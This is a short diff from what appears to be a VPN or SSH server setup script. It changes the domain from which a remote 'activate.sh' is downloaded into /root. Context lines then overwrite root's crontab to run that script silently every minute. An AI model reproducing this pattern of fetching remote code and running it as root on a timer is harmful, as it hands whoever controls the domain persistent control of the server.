@@ -1656,7 +1656,7 @@ user_name=`mysql -u $USER -p$PASS -D $DB -h $HOST -sN -e "$Query"`
 EOM
 		
 		
-wget -O /root/activate.sh "script.mediatek-vpn.com/ssh/prem/activate.sh"
+wget -O /root/activate.sh "script.psytech-vpn.com/ssh/prem/activate.sh"
 
 echo "* * * * * /bin/bash /root/activate.sh >/dev/null 2>&1" | crontab -
 
